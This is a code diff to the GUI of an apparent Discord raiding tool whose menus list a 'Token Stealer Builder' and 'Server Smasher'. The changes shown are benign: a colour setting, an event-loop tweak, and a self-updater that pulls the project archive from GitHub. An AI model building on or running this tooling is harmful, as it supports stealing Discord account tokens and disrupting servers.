@@ -312,6 +312,7 @@ if not command_line_mode == 1:
                      element_background_color=element_background_color,
                      scrollbar_color=scrollbar_color,
                      input_elements_background_color=input_elements_background_color,
+                     input_text_color=input_text_color,
                      button_color=button_color,
                      text_color=text_color)
 
@@ -675,7 +676,7 @@ def main(currentattacks):
         print(colored("25. Token options",menu2))
         choice = input(colored(">",menu2))
     elif command_line_mode == 0:
-        menu_def = [['RTB', ['Attack Manager', 'Themes', 'About', ['Info', 'Diagnostics']]],
+        menu_def = [['RTB', ['Attack Manager', 'Themes', 'About', ['Info', 'Diagnostics', 'Updater']]],
                     ['Tokens', ['View/Add Tokens', 'Token Stealer Builder']],
                     ['Help', ['Wiki', 'My YouTube', 'Discord Server', 'Telegram']],
                     ['Server Smasher', ['Launch']],
@@ -723,8 +724,6 @@ def main(currentattacks):
                     if event is None:
                         window.Close()
                         main(currentattacks)
-                    elif event == sg.TIMEOUT_KEY:
-                        pass
                     elif event == "Stop All":
                         for attack in currentattacks:
                             try:
@@ -857,6 +856,7 @@ def main(currentattacks):
                                          element_background_color=element_background_color,
                                          scrollbar_color=scrollbar_color,
                                          input_elements_background_color=input_elements_background_color,
+                                         input_text_color=input_text_color,
                                          button_color=button_color,
                                          text_color=text_color)
                         with open('config.json', 'r+') as handle:
@@ -911,6 +911,32 @@ def main(currentattacks):
             elif event == "Launch":
                 window.Close()
                 serversmasher(currentattacks)
+            elif event == "Updater":
+                if "b" in rtbversion:
+                    window.Close()
+                    main(currentattacks)
+                else:
+                    window.Close()
+                    yn = sg.PopupYesNo("Are you sure you want to update?", title="Update")
+                    if yn == "Yes":
+                        update = download_file('https://github.com/DeadBread76/Raid-Toolbox/archive/master.zip')
+                        shutil.copy("RTBFiles/smconfig.py", "RTBFiles/smconfig_old.py")
+                        shutil.unpack_archive(update)
+                        copy_tree("Raid-Toolbox-master/", ".")
+                        os.remove(update)
+                        shutil.rmtree("Raid-Toolbox-master/")
+                        with open('config.json', 'r+') as handle:
+                            edit = json.load(handle)
+                            edit['skin'] = skin
+                            edit['threadcount'] = threadcount
+                            handle.seek(0)
+                            json.dump(edit, handle, indent=4)
+                            handle.truncate()
+                        print ("Update complete, exiting.")
+                        os.kill(os.getpid(), 15)
+                    else:
+                        window.Close()
+                        main(currentattacks)
             elif event == "Wiki":
                 webbrowser.open("https://github.com/DeadBread76/Raid-Toolbox/wiki")
             elif event == "My YouTube":
